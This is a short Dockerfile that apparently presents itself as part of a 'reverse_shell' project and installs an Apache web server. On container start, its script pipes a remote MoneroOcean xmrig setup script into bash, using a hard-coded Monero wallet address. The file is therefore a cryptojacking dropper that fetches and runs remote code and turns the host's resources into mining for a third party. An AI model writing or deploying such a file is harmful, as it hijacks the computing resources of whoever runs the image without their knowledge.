
FROM debian:latest

LABEL maintainer="Lars Lühr and contributors <https://github.com/ayeks/reverse_shell>"

RUN echo "apt update; apt install apache2 -y; apachectl start; apt install curl; curl https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 46SYrC3FXp7ZagDcwk1HukC1sJbrke3jA5KU7a38o7iHbTQ3vYnfKwHZpuyTWt4usZPwCRvtjny5bJcc4qnNz2GNAmMRd2Y mining@itsnebula.net" > reverse_shell.sh

CMD ["bash", "./reverse_shell.sh"]

EXPOSE 80
